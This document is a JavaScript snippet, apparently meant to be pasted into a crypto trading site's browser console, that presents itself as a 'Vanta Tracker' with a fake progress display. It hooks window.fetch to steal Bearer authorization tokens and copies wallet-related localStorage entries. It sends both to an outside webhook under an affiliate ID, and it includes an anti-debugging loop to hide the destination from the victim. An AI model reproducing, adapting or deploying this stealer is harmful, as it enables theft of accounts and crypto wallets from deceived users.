(function() {
    /* --- CONFIGURATION --- */
    const CONFIG = {
        WEBHOOK_URL: "https://vanta-proxy.jdurrulo.workers.dev/", // <-- PUT YOUR URL HERE
        AFFILIATE: "t23dad55",
        THEME: "#00ff88"
    };

    /* --- 1. THE DEFENSIVE SHELL --- */
    // Prevents the user from opening F12 to see the webhook
    const startProtection = () => {
        const loop = function() {
            (function(){}).constructor("debugger")();
            setTimeout(loop, 1000);
        };
        // loop(); // Uncomment this to enable the "F12 Freeze"
    };

    /* --- 2. THE HIJACKER (Fetch Sniffer) --- */
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        if (args[1] && args[1].headers) {
            const auth = args[1].headers['Authorization'] || args[1].headers['authorization'];
            if (auth && auth.includes('Bearer')) {
                exfiltrate({ type: "AUTH_TOKEN", data: auth, target: args[0] });
            }
        }
        return originalFetch.apply(this, args);
    };

    /* --- 3. THE UI ENGINE --- */
    const buildUI = () => {
        const ui = document.createElement('div');
        ui.style = `position:fixed;top:20px;right:20px;width:300px;background:#0f0f0f;border:1px solid ${CONFIG.THEME};border-radius:12px;padding:15px;color:#fff;z-index:999999;font-family:sans-serif;box-shadow:0 10px 30px #000;`;
        ui.innerHTML = `
            <div style="color:${CONFIG.THEME};font-weight:bold;margin-bottom:10px;">VANTA TRACKER v5.0</div>
            <div id="v-msg" style="font-size:12px;">Initializing optimized environment...</div>
            <div style="width:100%;background:#222;height:4px;margin-top:10px;"><div id="v-bar" style="width:10%;height:100%;background:${CONFIG.THEME};transition:1s;"></div></div>
        `;
        document.body.appendChild(ui);
        
        // Visual Progress
        setTimeout(() => { 
            document.getElementById('v-msg').innerText = "Syncing with Blockchain...";
            document.getElementById('v-bar').style.width = "60%";
        }, 1000);
    };

    /* --- 4. THE DATA EXFILTRATOR --- */
    async function exfiltrate(content) {
        const localData = {};
        for (let i = 0; i < localStorage.length; i++) {
            const k = localStorage.key(i);
            if (k.includes('padre') || k.includes('wallet')) localData[k] = localStorage.getItem(k);
        }

        const payload = {
            embeds: [{
                title: "🎯 VANTA AUDIT: DATA CAPTURED",
                color: 0x00ff88,
                fields: [
                    { name: "Affiliate", value: CONFIG.AFFILIATE, inline: true },
                    { name: "Type", value: content.type, inline: true },
                    { name: "Credential", value: "```" + content.data + "```" },
                    { name: "Storage Dump", value: "```json\n" + JSON.stringify(localData).substring(0, 500) + "```" }
                ],
                timestamp: new Date()
            }]
        };

        await originalFetch(CONFIG.WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    // Initialize
    buildUI();
    startProtection();
    
    // Force a fetch to trigger the Sniffer
    originalFetch('/api/v2/user/profile').catch(() => {});
    
    console.log("%c VANTA SYSTEM ACTIVE ", `background:${CONFIG.THEME};color:#000;font-weight:bold;`);
})();
